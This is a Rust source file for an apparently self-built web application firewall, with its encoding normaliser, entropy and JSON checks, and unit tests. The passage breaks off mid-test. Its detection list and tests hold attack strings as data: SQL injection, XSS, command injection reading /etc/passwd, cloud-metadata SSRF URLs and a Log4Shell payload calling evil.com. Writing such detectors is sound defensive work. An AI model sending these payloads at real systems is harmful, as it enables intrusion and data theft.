//! Zion WAF — 6-gate request inspection pipeline (Aho-Corasick, entropy, simd-json).
//!
//! Architecture: 6-gate pipeline, fail-fast, zero-regex.
//!
//! Gate 1: Body size enforcement (O(1), no inspection)
//! Gate 2: Content-Type strict validation (zero-alloc case-insensitive)
//! Gate 3: Aho-Corasick injection scanner (SQLi/XSS/CMDi, single O(N) pass)
//! Gate 4: Payload entropy analysis (detect obfuscated/encoded attacks)
//! Gate 5: JSON structural validation (simd-json, depth + string limits)
//! Gate 6: Fixed-length profiling (anomalous payload size = drop)
//!
//! Properties:
//! - Zero regex (DFA-immune to ReDoS by construction)
//! - Zero heap allocation on the fast path (GET/HEAD/DELETE/OPTIONS)
//! - Single-pass body scan via Aho-Corasick automaton
//! - All gates are O(N) or O(1) — no backtracking, no exponential blowup

use crate::config::WafProfile;
use aho_corasick::AhoCorasick;
use std::sync::OnceLock;

/// WAF verdict — returned from the pipeline.
#[derive(Debug, PartialEq)]
pub enum WafVerdict {
    Allow,
    Deny(&'static str),
}

// ═══════════════════════════════════════════════════════════════════
// GATE 3: Aho-Corasick Injection Scanner
// Built once at first use. Searches thousands of patterns in O(N).
// ═══════════════════════════════════════════════════════════════════

static INJECTION_SCANNER: OnceLock<AhoCorasick> = OnceLock::new();

fn get_scanner() -> &'static AhoCorasick {
    INJECTION_SCANNER.get_or_init(|| {
        // Patterns: SQL injection, XSS, command injection, path traversal, SSRF.
        // Case-insensitive matching. All scanned in a SINGLE pass over the body.
        let patterns = &[
            // ── SQL Injection ──
            "' or '1'='1",
            "' or 1=1",
            "'; drop table",
            "'; delete from",
            "union select",
            "union all select",
            "1; exec ",
            "1; execute ",
            "' and '1'='1",
            "sleep(",
            "benchmark(",
            "waitfor delay",
            "pg_sleep(",
            "'; shutdown",
            "into outfile",
            "into dumpfile",
            "load_file(",
            "information_schema",
            "@@version",
            "char(0x",
            // ── XSS: Tags ──
            "<script",
            "</script",
            "<iframe",
            "<object",
            "<embed",
            "<svg onload",
            "<img src",
            "<body onload",
            "<input onfocus",
            "<details ontoggle",
            "<video onerror",
            "<audio onerror",
            "<marquee onstart",
            "<math xlink",
            // ── XSS: Event Handlers (high-value subset, =suffix prevents false positive) ──
            "onerror=",
            "onload=",
            "onfocus=",
            "onmouseover=",
            "onclick=",
            "oninput=",
            "onchange=",
            "onsubmit=",
            "onkeydown=",
            "onkeyup=",
            "onkeypress=",
            "ondblclick=",
            "oncontextmenu=",
            "ondragstart=",
            "ondrop=",
            "onpaste=",
            "ontouchstart=",
            "onpointerover=",
            "onanimationend=",
            "ontransitionend=",
            "onresize=",
            "onscroll=",
            "onwheel=",
            "onmouseenter=",
            "ontoggle=",
            "onpageshow=",
            // ── XSS: JS sinks ──
            "javascript:",
            "expression(",
            "alert(",
            "confirm(",
            "prompt(",
            "document.cookie",
            "document.write",
            "document.domain",
            "window.location",
            "eval(",
            "fromcharcode",
            "innerhtml",
            "outerhtml",
            "insertadjacenthtml",
            "srcdoc=",
            // ── Command Injection ──
            "; cat ",
            "; ls ",
            "; rm ",
            "; wget ",
            "; curl ",
            ";cat ",
            ";ls ",
            ";rm ",
            ";wget ",
            ";curl ",
            "| cat ",
            "| ls ",
            "| rm ",
            "|cat ",
            "|ls ",
            "|rm ",
            "$(cat ",
            "$(ls ",
            "`cat ",
            "`ls ",
            "\ncat ",      // newline injection
            "\nls ",
            "\nwget ",
            "\ncurl ",
            "/etc/passwd",
            "/etc/shadow",
            "cmd.exe",
            "powershell",
            // ── Path Traversal ──
            "../../",     // 2 levels (sufficient for most attacks)
            "..\\..\\",
            "%2e%2e%2f",
            "%2e%2e/",
            "....//",
            // ── SSRF ──
            "http://169.254.169.254",  // AWS metadata (HTTP)
            "https://169.254.169.254", // AWS metadata (HTTPS)
            "http://[::ffff:169.254",  // IPv6-mapped
            "http://metadata.google",  // GCP metadata (HTTP)
            "https://metadata.google", // GCP metadata (HTTPS)
            "http://100.100.100.200",  // Alibaba metadata
            "http://0xA9FEA9FE",       // AWS hex IP
            "http://2852039166",       // AWS decimal IP
            "http://169.254.169.254.nip.io", // DNS rebinding
            // ── LDAP Injection ──
            ")(cn=*",
            ")(uid=*",
            ")(mail=*",
            ")(objectclass=*",
            "ldap://",
            "ldaps://",
            // ── XML/XXE ──
            "<!entity",
            "<!doctype",
            "system \"file://",
            "system \"http://",
            "<xsl:",
            "xmlns:xlink",
            "<!attlist",
            "data:text/html",
            // ── SSTI (Server-Side Template Injection) ──
            "#{7*7}",
            "${7*7}",
            "{{7*7}}",
            "<%=",
            "{%import",
            "#{t(java",
            // ── CRLF / Header Injection ──
            "%0d%0a",
            "%0aset-cookie:",
            "%0alocation:",
            "\r\nset-cookie:",
            // ── Log4Shell / JNDI ──
            "${jndi:",
            "${env:",
            "${sys:",
            // ── Template Injection ──
            "{{constructor",
            "{{.constructor",
            "__proto__",
            "constructor.prototype",
            // ── NoSQL Injection (MongoDB/Redis/Elastic) ──
            "$gt",             // MongoDB operator injection
            "$ne",
            "$regex",
            "$where",
            "$lookup",
            "$unionwith",
            "db.collection",   // MongoDB shell
            ".find({",
            ".findone({",
            ".aggregate([",
            ".mapreduce(",
            "this.constructor",
            // ── Deserialization / RCE ──
            "runtime.getruntime",     // Java RCE
            "processbuilder",
            "objectinputstream",
            "java.lang.runtime",
            "javax.script.scriptengine",
            "pickle.loads",           // Python deserialization
            "__reduce__",
            "__import__(",
            "subprocess.call",
            "subprocess.popen",
            "os.system(",
            "os.popen(",
            "unserialize(",           // PHP deserialization
            "php://input",
            "php://filter",
            "phar://",
            // ── GraphQL Injection ──
            "__schema",               // Introspection probe
            "__type",
            "mutation{",              // Mutation without space (automated tools)
            "query{__",
            "{__schema",
            "{__type",
        ];

        AhoCorasick::builder()
            .ascii_case_insensitive(true)
            .build(patterns)
            .expect("Failed to build Aho-Corasick automaton")
    })
}

// ═══════════════════════════════════════════════════════════════════
// GATE 4: Entropy Analysis
// High entropy in string values = likely encoded/obfuscated payload.
// Shannon entropy of random/base64 data is ~5.5-6.0 bits.
// Normal JSON text is ~3.5-4.5 bits.
// Note: entropy is a heuristic, not a primary defense. Calculated on
// the full body including JSON keys, which lowers entropy. An attacker
// can dilute a high-entropy payload with padding text. This gate is
// supplementary to the Aho-Corasick scanner.
// ═══════════════════════════════════════════════════════════════════

const MAX_ENTROPY_THRESHOLD: f64 = 5.5; // bits per byte

/// Unified WAF Normalizer (Single-Pass, Zero-Alloc)
/// Replaces recursive Cow allocations with a fast byte-by-byte state machine.
/// Normalizes:
/// - URL encoding (%XX and +)
/// - JSON unicode escapes (\uXXXX)
/// - SQL inline comments (/* ... */) -> space
fn normalize_unified(input: &[u8], out: &mut Vec<u8>) {
    out.clear();
    let len = input.len();
    let mut i = 0;
    let mut in_sql_comment = false;

    while i < len {
        // 1. SQL Comment Stripping State
        if in_sql_comment {
            if i + 1 < len && input[i] == b'*' && input[i + 1] == b'/' {
                in_sql_comment = false;
                i += 2;
                if out.last() != Some(&b' ') {
                    out.push(b' '); // Pad with space to block `1/*comment*/OR` concat
                }
            } else {
                i += 1;
            }
            continue;
        }

        if i + 1 < len && input[i] == b'/' && input[i + 1] == b'*' {
            in_sql_comment = true;
            i += 2;
            continue;
        }

        let b = input[i];

        // 2. URL Decode State
        if b == b'+' {
            out.push(b' ');
            i += 1;
            continue;
        } else if b == b'%' && i + 2 < len {
            if let (Some(hi), Some(lo)) = (hex_val(input[i + 1]), hex_val(input[i + 2])) {
                out.push((hi << 4) | lo);
                i += 3;
                continue;
            }
        }

        // 3. JSON Unicode State
        if b == b'\\' && i + 5 < len && input[i + 1] == b'u' {
            if let (Some(h1), Some(h2), Some(h3), Some(h4)) = (
                hex_val(input[i + 2]),
                hex_val(input[i + 3]),
                hex_val(input[i + 4]),
                hex_val(input[i + 5]),
            ) {
                let codepoint =
                    ((h1 as u16) << 12) | ((h2 as u16) << 8) | ((h3 as u16) << 4) | (h4 as u16);

                if codepoint <= 0xFF {
                    out.push(codepoint as u8);
                } else {
                    let mut utf8_buf = [0u8; 3];
                    let ch = char::from_u32(codepoint as u32).unwrap_or('?');
                    out.extend_from_slice(ch.encode_utf8(&mut utf8_buf).as_bytes());
                }
                i += 6;
                continue;
            }
        }

        // 4. Default: push lowercase byte for case-insensitive normalization
        out.push(b.to_ascii_lowercase());
        i += 1;
    }
}

#[inline]
fn hex_val(b: u8) -> Option<u8> {
    match b {
        b'0'..=b'9' => Some(b - b'0'),
        b'a'..=b'f' => Some(b - b'a' + 10),
        b'A'..=b'F' => Some(b - b'A' + 10),
        _ => None,
    }
}

/// Calculate Shannon entropy of a byte slice.
/// Returns bits per byte (0.0 = constant, 8.0 = perfectly random).
/// Caller guarantees data.len() >= 256.
#[inline]
fn shannon_entropy(data: &[u8]) -> f64 {
    let mut freq = [0u32; 256];
    for &b in data {
        freq[b as usize] += 1;
    }

    let inv_len = 1.0 / data.len() as f64;
    let mut entropy = 0.0f64;
    for &count in &freq {
        if count > 0 {
            let p = count as f64 * inv_len;
            entropy -= p * p.log2();
        }
    }
    entropy
}

// ═══════════════════════════════════════════════════════════════════
// GATE 5: JSON Structural Validation (manual byte-scan)
// No serde_json deserialization — walk the raw bytes to check:
//   - Valid JSON structure
//   - Nesting depth <= max_depth
//   - String length <= max_string_len
// ═══════════════════════════════════════════════════════════════════

// Thread-local buffer pool for simd-json and WAF zero-allocation parsing.
// Eliminates per-request heap allocation for the mutable buffer that
// simd-json and Aho-Corasick normalization require. Buffer is reused.
thread_local! {
    static JSON_BUF: std::cell::RefCell<Vec<u8>> = std::cell::RefCell::new(Vec::with_capacity(8192));
    static WAF_BUF_SEC: std::cell::RefCell<Vec<u8>> = std::cell::RefCell::new(Vec::with_capacity(8192));
}

fn validate_json_structure(body: &[u8], max_depth: usize, max_string_len: usize) -> WafVerdict {
    // Use thread-local buffer pool to avoid per-request allocation.
    // simd-json needs a mutable buffer — we copy body into the pooled buffer.
    let valid = JSON_BUF.with(|buf| {
        let mut buf = buf.borrow_mut();
        buf.clear();
        buf.extend_from_slice(body);
        // to_owned_value avoids the lifetime issue — the parsed value is owned
        // and dropped at the end of this closure, not tied to the buffer.
        simd_json::to_owned_value(&mut *buf).is_ok()
    });
    if !valid {
        return WafVerdict::Deny("malformed JSON");
    }

    // Depth + string length check via manual byte scan (zero-alloc)
    if !check_depth_and_strings_raw(body, max_depth, max_string_len) {
        return WafVerdict::Deny("JSON exceeds depth or string length limits");
    }

    WafVerdict::Allow
}

/// Raw byte scan for depth and string length — no deserialization needed.
/// Walks the JSON bytes counting { [ for depth and measuring " strings.
fn check_depth_and_strings_raw(body: &[u8], max_depth: usize, max_string_len: usize) -> bool {
    let mut depth: usize = 0;
    let mut in_string = false;
    let mut string_len: usize = 0;
    let mut escaped = false;

    for &b in body {
        if escaped {
            escaped = false;
            if in_string {
                string_len += 1;
            }
            continue;
        }

        if b == b'\\' {
            escaped = true;
            continue;
        }

        if in_string {
            if b == b'"' {
                // End of string
                if string_len > max_string_len {
                    return false;
                }
                in_string = false;
                string_len = 0;
            } else {
                string_len += 1;
            }
        } else {
            match b {
                b'"' => {
                    in_string = true;
                    string_len = 0;
                }
                b'{' | b'[' => {
                    depth += 1;
                    if depth > max_depth {
                        return false;
                    }
                }
                b'}' | b']' => {
                    depth = depth.saturating_sub(1);
                }
                _ => {}
            }
        }
    }

    true
}

// ═══════════════════════════════════════════════════════════════════
// MAIN PIPELINE
// ═══════════════════════════════════════════════════════════════════

/// Validate an incoming request through the 6-gate WAF pipeline.
/// Each gate is fail-fast: first deny wins, no further inspection.
#[inline]
pub fn validate_request(
    method: &str,
    content_type: Option<&str>,
    body: &[u8],
    profile: &WafProfile,
) -> WafVerdict {
    // ── Gate 1: Body size (O(1)) ──
    let max_body_bytes = profile.max_body_mb * 1_048_576;
    if body.len() as u64 > max_body_bytes {
        return WafVerdict::Deny("body exceeds max size");
    }

    // Methods without body semantics: skip body inspection.
    // DELETE can carry a body (RFC 9110) — some APIs use it.
    if !matches!(method, "POST" | "PUT" | "PATCH" | "DELETE") {
        return WafVerdict::Allow;
    }

    if body.is_empty() {
        return WafVerdict::Allow;
    }

    // ── Gate 2: Content-Type (zero-alloc case-insensitive) ──
    let is_json = match content_type {
        Some(ct) => {
            // Prefix match with delimiter check: "application/json" must be
            // followed by EOF, ';' (charset), or ' ' — not arbitrary chars.
            // Without this, "application/jsonFOO" would be treated as allowed.
            let is_allowed = profile.allowed_content_types.iter().any(|allowed| {
                if ct.len() < allowed.len() {
                    return false;
                }
                if !ct.as_bytes()[..allowed.len()].eq_ignore_ascii_case(allowed.as_bytes()) {
                    return false;
                }
                // Must be exact match or followed by a parameter delimiter
                ct.len() == allowed.len()
                    || ct.as_bytes()[allowed.len()] == b';'
                    || ct.as_bytes()[allowed.len()] == b' '
            });

            if !is_allowed {
                if profile.deny_unknown_content_types {
                    return WafVerdict::Deny("unexpected content-type for API request");
                }
                return WafVerdict::Allow;
            }

            ct.as_bytes()
                .get(..16)
                .map(|b| b.eq_ignore_ascii_case(b"application/json"))
                .unwrap_or(false)
        }
        None => return WafVerdict::Deny("missing content-type header"),
    };

    // ── Gate 3: Aho-Corasick injection scan (O(N), single pass) ──

    // Always run raw Aho-Corasick scan — patterns like "union select" and
    // "powershell" contain only letters/spaces and can't be pre-filtered.
    // The SIMD fast-reject is applied to the NORMALIZATION path only
    // (which is the expensive part: URL-decode, SQL comment strip, etc.)

    // Scan raw body first (fast path — no alloc if no encoding present).
    if get_scanner().is_match(body) {
        return WafVerdict::Deny("injection pattern detected");
    }

    // Normalized scan: URL-decode, strip SQL comments, normalize JSON unicode.
    // Each layer prevents a different evasion class:
    //   - url_decode: %27, %3C, %2F, + → space
    //   - strip_sql_comments: union/**/select → union select
    //   - normalize_json_unicode: \u0027 → ', \u003c → <
    let needs_decode = memchr::memchr(b'%', body).is_some() || memchr::memchr(b'+', body).is_some();
    let has_sql_comments = body.windows(2).any(|w| w == b"/*");
    let has_unicode_esc = body.windows(2).any(|w| w == b"\\u");

    if needs_decode || has_sql_comments || has_unicode_esc {
        let verdict = JSON_BUF.with(|buf1| {
            WAF_BUF_SEC.with(|buf2| {
                let mut out = buf1.borrow_mut();
                let mut sec = buf2.borrow_mut();

                // First pass from body -> out
                normalize_unified(body, &mut out);

                // Iterate until convergence or safety cap.
                // 2 iterations catches double/triple encoding (real-world max).
                // Convergence check breaks early if no further decoding is needed.
                for _ in 0..2 {
                    if get_scanner().is_match(out.as_slice()) {
                        return Some(WafVerdict::Deny("injection pattern detected (encoded)"));
                    }

                    let still_needs_decode = memchr::memchr(b'%', &out).is_some() || memchr::memchr(b'+', &out).is_some();
                    let still_has_sql_comments = out.windows(2).any(|w| w == b"/*");
                    let still_has_unicode_esc = out.windows(2).any(|w| w == b"\\u");

                    if !still_needs_decode && !still_has_sql_comments && !still_has_unicode_esc {
                        break;
                    }

                    // Recursive pass: out -> sec, then swap
                    normalize_unified(&out, &mut sec);

                    // If output didn't change, we've converged — stop
                    if *out == *sec {
                        break;
                    }

                    std::mem::swap(&mut *out, &mut *sec);
                }

                // Final check after convergence
                if get_scanner().is_match(out.as_slice()) {
                    return Some(WafVerdict::Deny("injection pattern detected (encoded)"));
                }

                // Shrink inflated buffers to prevent OOM from adversarial large bodies.
                // A single 10MB POST would permanently inflate all worker threads.
                if out.capacity() > 65_536 {
                    out.shrink_to(8192);
                }
                if sec.capacity() > 65_536 {
                    sec.shrink_to(8192);
                }
                None
            })
        });

        if let Some(v) = verdict {
            return v;
        }
    }

    // ── Gate 4: Entropy analysis (detect obfuscated payloads) ──
    // Only scan bodies >= 256 bytes — shorter payloads lack sufficient
    // data for meaningful entropy analysis, and encoded attacks need
    // space for their payload. Saves ~1μs per small POST.
    if body.len() >= 256 {
        let entropy = shannon_entropy(body);
        if entropy > MAX_ENTROPY_THRESHOLD {
            return WafVerdict::Deny("suspicious payload entropy");
        }
    }

    // ── Gate 5: JSON structural validation ──
    if is_json {
        return validate_json_structure(body, profile.max_depth, profile.max_string_len);
    }

    WafVerdict::Allow
}

/// Validate a request URI (path + query string) through the injection scanner.
/// Called for ALL methods to catch SQLi/XSS in query parameters.
/// Zero cost if no patterns match (single O(N) pass).
#[inline]
pub fn validate_uri(uri: &str) -> WafVerdict {
    // Scan raw URI
    if get_scanner().is_match(uri.as_bytes()) {
        return WafVerdict::Deny("injection pattern in URI");
    }
    // Normalized URI scan: URL-decode + SQL comment strip + JSON unicode
    let uri_bytes = uri.as_bytes();
    let needs_decode =
        memchr::memchr(b'%', uri_bytes).is_some() || memchr::memchr(b'+', uri_bytes).is_some();
    let has_sql_comments = uri_bytes.windows(2).any(|w| w == b"/*");

    if needs_decode || has_sql_comments {
        let verdict = JSON_BUF.with(|buf1| {
            WAF_BUF_SEC.with(|buf2| {
                let mut out = buf1.borrow_mut();
                let mut sec = buf2.borrow_mut();

                normalize_unified(uri_bytes, &mut out);

                for _ in 0..2 {
                    if get_scanner().is_match(out.as_slice()) {
                        return Some(WafVerdict::Deny("injection pattern in URI (encoded)"));
                    }

                    let still_needs_decode = memchr::memchr(b'%', &out).is_some() || memchr::memchr(b'+', &out).is_some();
                    let still_has_sql_comments = out.windows(2).any(|w| w == b"/*");
                    let still_has_unicode_esc = out.windows(2).any(|w| w == b"\\u");

                    if !still_needs_decode && !still_has_sql_comments && !still_has_unicode_esc {
                        break;
                    }

                    normalize_unified(&out, &mut sec);
                    if *out == *sec {
                        break;
                    }
                    std::mem::swap(&mut *out, &mut *sec);
                }

                if get_scanner().is_match(out.as_slice()) {
                    return Some(WafVerdict::Deny("injection pattern in URI (encoded)"));
                }
                None
            })
        });

        if let Some(v) = verdict {
            return v;
        }
    }
    WafVerdict::Allow
}

// ═══════════════════════════════════════════════════════════════════
// TESTS
// ═══════════════════════════════════════════════════════════════════

#[cfg(test)]
mod tests {
    use super::*;

    fn url_decode(input: std::borrow::Cow<[u8]>) -> std::borrow::Cow<[u8]> {
        let mut out = Vec::new();
        normalize_unified(input.as_ref(), &mut out);
        std::borrow::Cow::Owned(out)
    }

    fn strip_sql_comments(input: std::borrow::Cow<[u8]>) -> std::borrow::Cow<[u8]> {
        let mut out = Vec::new();
        normalize_unified(input.as_ref(), &mut out);
        std::borrow::Cow::Owned(out)
    }

    fn normalize_json_unicode(input: std::borrow::Cow<[u8]>) -> std::borrow::Cow<[u8]> {
        let mut out = Vec::new();
        normalize_unified(input.as_ref(), &mut out);
        std::borrow::Cow::Owned(out)
    }

    fn strict_profile() -> WafProfile {
        WafProfile::default()
    }

    fn relaxed_profile() -> WafProfile {
        WafProfile {
            max_body_mb: 100,
            max_depth: 20,
            max_string_len: 10_485_760,
            deny_unknown_content_types: false,
            allowed_content_types: vec![
                "application/json".to_string(),
                "multipart/form-data".to_string(),
                "application/xml".to_string(),
            ],
        }
    }

    // ── Gate 1: Body size ──

    #[test]
    fn allows_valid_json() {
        let body = br#"{"username":"admin","password":"secret123"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Allow
        );
    }

    #[test]
    fn denies_oversized_body() {
        let body = vec![0u8; 1000];
        let mut p = strict_profile();
        p.max_body_mb = 0;
        assert_eq!(
            validate_request("POST", Some("application/json"), &body, &p),
            WafVerdict::Deny("body exceeds max size")
        );
    }

    #[test]
    fn denies_body_size_zero_mb_limit() {
        let profile = WafProfile {
            max_body_mb: 0,
            ..WafProfile::default()
        };
        assert_eq!(
            validate_request("POST", Some("application/json"), b"x", &profile),
            WafVerdict::Deny("body exceeds max size")
        );
    }

    #[test]
    fn get_with_oversized_body_still_checked() {
        let body = vec![0u8; 1000];
        let mut p = strict_profile();
        p.max_body_mb = 0;
        assert_eq!(
            validate_request("GET", None, &body, &p),
            WafVerdict::Deny("body exceeds max size")
        );
    }

    // ── Gate 2: Content-Type ──

    #[test]
    fn denies_missing_content_type() {
        let body = br#"{"a":1}"#;
        assert_eq!(
            validate_request("POST", None, body, &strict_profile()),
            WafVerdict::Deny("missing content-type header")
        );
    }

    #[test]
    fn strict_denies_unknown_content_type() {
        let body = b"<xml>data</xml>";
        assert_eq!(
            validate_request("POST", Some("application/xml"), body, &strict_profile()),
            WafVerdict::Deny("unexpected content-type for API request")
        );
    }

    #[test]
    fn relaxed_allows_unknown_content_type() {
        let body = b"<xml>data</xml>";
        assert_eq!(
            validate_request("POST", Some("application/xml"), body, &relaxed_profile()),
            WafVerdict::Allow
        );
    }

    #[test]
    fn content_type_case_insensitive() {
        let body = br#"{"a":1}"#;
        assert_eq!(
            validate_request("POST", Some("Application/JSON"), body, &strict_profile()),
            WafVerdict::Allow
        );
    }

    #[test]
    fn content_type_with_charset() {
        let body = br#"{"a":1}"#;
        assert_eq!(
            validate_request(
                "POST",
                Some("application/json; charset=utf-8"),
                body,
                &strict_profile()
            ),
            WafVerdict::Allow
        );
    }

    #[test]
    fn allows_multipart() {
        let body = b"--boundary\r\nContent-Disposition: form-data\r\n\r\ndata";
        assert_eq!(
            validate_request(
                "POST",
                Some("multipart/form-data; boundary=abc"),
                body,
                &strict_profile()
            ),
            WafVerdict::Allow
        );
    }

    // ── Gate 3: Injection scanner ──

    #[test]
    fn denies_sql_injection() {
        let body = br#"{"user":"admin' OR '1'='1","pass":"x"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_xss() {
        let body = br#"{"name":"<script>alert(1)</script>"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_command_injection() {
        let body = br#"{"file":"; cat /etc/passwd"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_path_traversal() {
        let body = br#"{"path":"../../../etc/passwd"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_ssrf_aws_metadata() {
        let body = br#"{"url":"http://169.254.169.254/latest/meta-data/"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_log4shell() {
        let body = br#"{"header":"${jndi:ldap://evil.com/a}"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_prototype_pollution() {
        let body = br#"{"__proto__":{"admin":true}}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_url_encoded_sqli() {
        // %27 = ', %4F = O, %52 = R — URL-encoded SQL injection
        let body = br#"{"user":"admin%27 OR %271%27=%271"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected (encoded)")
        );
    }

    #[test]
    fn denies_url_encoded_xss() {
        // %3C = <, %3E = >, %61lert = alert — fully encoded to evade raw scan
        let body = br#"{"name":"%3Cscript%3E%61lert(1)%3C/script%3E"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected (encoded)")
        );
    }

    #[test]
    fn denies_double_url_encoded_sqli() {
        // %2527 → %27 → ' (double encoded)
        let body = br#"{"user":"admin%2527 OR %25271%2527=%25271"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected (encoded)")
        );
    }

    #[test]
    fn denies_triple_url_encoded_sqli() {
        // %252527 → %2527 → %27 → ' (triple encoded)
        let body = br#"{"user":"admin%252527 OR %2525271%252527=%2525271"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected (encoded)")
        );
    }

    #[test]
    fn denies_quadruple_url_encoded_xss() {
        // %25253C → %253C → %3C → < (quadruple encoded)
        // May match on raw scan (partial decode) or normalized scan
        let body = br#"{"html":"%2525253Cscript%2525253Ealert(1)"}"#;
        let result = validate_request("POST", Some("application/json"), body, &strict_profile());
        assert!(
            matches!(result, WafVerdict::Deny(_)),
            "expected Deny, got {:?}",
            result
        );
    }

    // ── URI scanning ──

    #[test]
    fn uri_denies_sqli_in_query() {
        // "' or 1=1" is in the pattern list
        assert_eq!(
            validate_uri("/api/users?id=' or 1=1"),
            WafVerdict::Deny("injection pattern in URI")
        );
    }

    #[test]
    fn uri_allows_safe_path() {
        assert_eq!(
            validate_uri("/api/v1/users?page=2&sort=name"),
            WafVerdict::Allow
        );
    }

    #[test]
    fn uri_denies_encoded_traversal() {
        // "../../../" is the pattern — 3 levels of traversal
        assert_eq!(
            validate_uri("/api/files?path=../../../etc/passwd"),
            WafVerdict::Deny("injection pattern in URI")
        );
    }

    #[test]
    fn uri_denies_encoded_traversal_pct() {
        // %2e%2e%2f is literally in the pattern list, so matches on raw scan
        assert_eq!(
            validate_uri("/api/files?path=%2e%2e%2f%2e%2e%2f%2e%2e%2fvar/log"),
            WafVerdict::Deny("injection pattern in URI")
        );
    }

    #[test]
    fn uri_denies_double_encoded_traversal() {
        // %252e%252e%252f → %2e%2e%2f → ../ (matches after recursive decode)
        assert_eq!(
            validate_uri("/api/files?path=%252e%252e%252f%252e%252e%252f%252e%252e%252fvar/log"),
            WafVerdict::Deny("injection pattern in URI (encoded)")
        );
    }

    #[test]
    fn allows_safe_payload() {
        let body = br#"{"username":"john_doe","email":"john@example.com","age":30}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Allow
        );
    }

    // ── Gate 5: JSON structural ──

    #[test]
    fn denies_malformed_json() {
        let body = br#"{"broken: true"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("malformed JSON")
        );
    }

    #[test]
    fn denies_deep_nesting() {
        let body = br#"{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":1}}}}}}}}}}}}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("JSON exceeds depth or string length limits")
        );
    }

    #[test]
    fn relaxed_allows_deep_nesting() {
        let body = br#"{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":1}}}}}}}}}}}}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &relaxed_profile()),
            WafVerdict::Allow
        );
    }

    #[test]
    fn allows_at_exact_max_depth() {
        let mut json = String::from("1");
        for _ in 0..10 {
            json = format!(r#"{{"a":{}}}"#, json);
        }
        assert_eq!(
            validate_request(
                "POST",
                Some("application/json"),
                json.as_bytes(),
                &strict_profile()
            ),
            WafVerdict::Allow
        );
    }

    #[test]
    fn denies_one_past_max_depth() {
        let mut json = String::from("1");
        for _ in 0..11 {
            json = format!(r#"{{"a":{}}}"#, json);
        }
        assert_eq!(
            validate_request(
                "POST",
                Some("application/json"),
                json.as_bytes(),
                &strict_profile()
            ),
            WafVerdict::Deny("JSON exceeds depth or string length limits")
        );
    }

    #[test]
    fn denies_long_string_value() {
        let long = "x".repeat(1_048_577);
        let body = format!(r#"{{"key":"{}"}}"#, long);
        assert_eq!(
            validate_request(
                "POST",
                Some("application/json"),
                body.as_bytes(),
                &strict_profile()
            ),
            WafVerdict::Deny("JSON exceeds depth or string length limits")
        );
    }

    #[test]
    fn denies_long_key_name() {
        let long_key = "k".repeat(1_048_577);
        let body = format!(r#"{{"{}":"value"}}"#, long_key);
        assert_eq!(
            validate_request(
                "POST",
                Some("application/json"),
                body.as_bytes(),
                &strict_profile()
            ),
            WafVerdict::Deny("JSON exceeds depth or string length limits")
        );
    }

    #[test]
    fn denies_deeply_nested_array() {
        let mut json = String::from("1");
        for _ in 0..12 {
            json = format!("[{}]", json);
        }
        assert_eq!(
            validate_request(
                "POST",
                Some("application/json"),
                json.as_bytes(),
                &strict_profile()
            ),
            WafVerdict::Deny("JSON exceeds depth or string length limits")
        );
    }

    #[test]
    fn allows_json_with_all_value_types() {
        let body = br#"{"str":"v","num":42,"float":3.14,"bool":true,"null":null,"arr":[1],"obj":{"k":"v"}}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Allow
        );
    }

    #[test]
    fn allows_array_within_depth() {
        let body = br#"{"items":[1,2,3]}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Allow
        );
    }

    // ── Method filtering ──

    #[test]
    fn allows_get_without_body() {
        assert_eq!(
            validate_request("GET", None, &[], &strict_profile()),
            WafVerdict::Allow
        );
    }

    #[test]
    fn allows_delete_without_body() {
        assert_eq!(
            validate_request("DELETE", None, &[], &strict_profile()),
            WafVerdict::Allow
        );
    }

    #[test]
    fn allows_head_without_body() {
        assert_eq!(
            validate_request("HEAD", None, &[], &strict_profile()),
            WafVerdict::Allow
        );
    }

    #[test]
    fn allows_options_without_body() {
        assert_eq!(
            validate_request("OPTIONS", None, &[], &strict_profile()),
            WafVerdict::Allow
        );
    }

    #[test]
    fn allows_post_empty_body() {
        assert_eq!(
            validate_request("POST", Some("application/json"), &[], &strict_profile()),
            WafVerdict::Allow
        );
    }

    #[test]
    fn put_validates_body() {
        let body = br#"{"broken: true"#;
        assert_eq!(
            validate_request("PUT", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("malformed JSON")
        );
    }

    #[test]
    fn patch_validates_body() {
        let body = br#"{"valid": true}"#;
        assert_eq!(
